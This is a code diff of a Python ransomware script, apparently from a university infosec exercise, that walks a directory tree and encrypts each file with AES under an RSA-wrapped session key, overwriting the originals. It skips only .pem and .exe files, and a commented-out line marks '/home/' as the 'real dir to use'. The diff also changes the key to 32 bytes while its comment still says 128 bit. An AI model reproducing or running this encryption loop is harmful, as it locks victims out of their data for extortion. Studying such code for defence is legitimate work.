@@ -38,7 +38,8 @@ def encrypt(data_file, public_key, extension):
 
     # create public key object
     key = RSA.import_key(public_key)
-    sessionKey = os.urandom(16)
+    sessionKey = os.urandom(32)# size 128 bit
+    #sessionKey = os.urandom(16)# size 128 bit
 
     # encrypt the session key with the public key
     cipher = PKCS1_OAEP.new(key)
@@ -49,8 +50,10 @@ def encrypt(data_file, public_key, extension):
     ciphertext = cipher.encrypt(data)
     tag = cipher.digest()
 
+    # remove session key from memory
     del sessionKey
     gc.collect()
+    
     # save the encrypted data to file
     file_name = data_file.split(extension)[0]
     with open(file_name, 'wb') as f:
@@ -62,15 +65,19 @@ def encrypt(data_file, public_key, extension):
     if extension:
         os.rename(file_name, file_name+extension)
 
-# dir to encrypt
-directory = '/home/marcelo/Documents/infosec/ex2/TestRansomware' 
+
+#directory ='/home/' # real dir to use
+#test dir
+directory ='/home/marcelo/Documents/infosec/ex2/TestRansomsware/'
 exclude_extension = ['.pem', '.exe']
 
 for item in scan_recurse(directory): 
     file_path = Path(item)
     fileType = file_path.suffix.lower()
+    
     if fileType in exclude_extension:
         continue
+    #print(str(file_path))   
     encrypt(file_path, pubKey, fileType)
 
 def create_file_on_desktop(file_name, content):
